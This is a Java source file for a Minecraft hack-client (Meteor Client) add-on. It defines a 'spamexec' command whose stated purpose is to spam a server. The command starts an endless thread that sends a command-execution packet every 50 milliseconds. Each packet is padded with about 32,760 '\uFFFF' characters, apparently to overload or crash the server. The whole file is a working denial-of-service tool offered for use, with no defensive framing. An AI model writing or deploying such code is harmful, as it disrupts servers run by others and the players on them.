package com.x310.clarity.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;

public class SpamCommandExec extends Command {
    public SpamCommandExec() {
        super("spamexec", "spams server with CommandExecutionC2S packets");
    }

    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes((context) -> {
            new Thread(() -> {
                ClientPlayNetworkHandler handler = mc.getNetworkHandler();
                assert handler != null;

                String longString = "skill " + "\uFFFF".repeat(32760);

                while (true) {
                    for (int i = 0; i < 1; i++) {
                        handler.sendPacket(new CommandExecutionC2SPacket(longString));
//                        handler.sendChatCommand(longString);

                    }
                    try {
                        Thread.sleep(50);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
            }).start();

            return 1;
        });
    }
}
